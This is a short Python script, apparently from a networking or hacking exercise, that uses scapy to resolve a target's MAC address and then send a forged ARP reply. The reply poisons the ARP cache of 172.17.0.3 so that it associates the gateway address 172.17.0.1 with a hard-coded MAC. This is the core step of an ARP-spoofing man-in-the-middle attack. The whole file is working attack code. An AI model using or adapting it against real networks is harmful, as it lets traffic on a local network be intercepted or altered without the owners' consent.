#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys


def get_arp_request(target_ip):
    scapy.ls(scapy.ARP())
    return scapy.ARP(pdst=target_ip)


def get_broadcast():
    return scapy.Ether(dst='ff:ff:ff:ff:ff:ff')


def get_mac(target_ip):
    arp_request = get_arp_request(target_ip)
    broadcast = get_broadcast()
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst='02:42:ac:11:00:03', psrc=spoof_ip)
    scapy.send(packet)


spoof('172.17.0.3', '172.17.0.1')
